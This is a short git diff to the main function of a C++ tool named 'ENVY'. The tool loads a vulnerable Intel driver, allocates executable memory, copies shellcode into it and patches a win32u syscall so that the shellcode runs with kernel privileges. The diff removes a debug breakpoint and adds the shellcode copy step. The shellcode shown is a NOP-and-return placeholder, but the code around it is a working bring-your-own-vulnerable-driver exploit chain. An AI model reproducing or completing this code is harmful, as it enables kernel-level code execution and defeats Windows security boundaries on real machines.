@@ -11,7 +11,6 @@ using namespace kernel;
 
 int main(int argc, char** args)
 {
-	DebugBreak();
 	std::cout << "[+] Welcome to ENVY..." << std::endl;
 	std::cout << "[+] Loading vulnerable driver..." << std::endl;
 	std::unique_ptr<kernel::vulnerable_driver> driver_resource = std::unique_ptr<kernel::vulnerable_driver>(new intel::intel_vulnerable_driver());
@@ -26,6 +25,8 @@ int main(int argc, char** args)
 	uint8_t shellbytes[] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xC3};
 
 	uint64_t shellcode_buffer = reinterpret_cast<uint64_t>(VirtualAlloc(nullptr, sizeof(shellbytes), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
+
+	memcpy((void*)shellcode_buffer, (void*)shellbytes, sizeof(shellbytes));
 
 	win32u->patch_syscall(driver_resource.get(), shellcode_buffer);
 	win32u->execute_and_restore_syscall<void(*)(void)>(driver_resource.get());
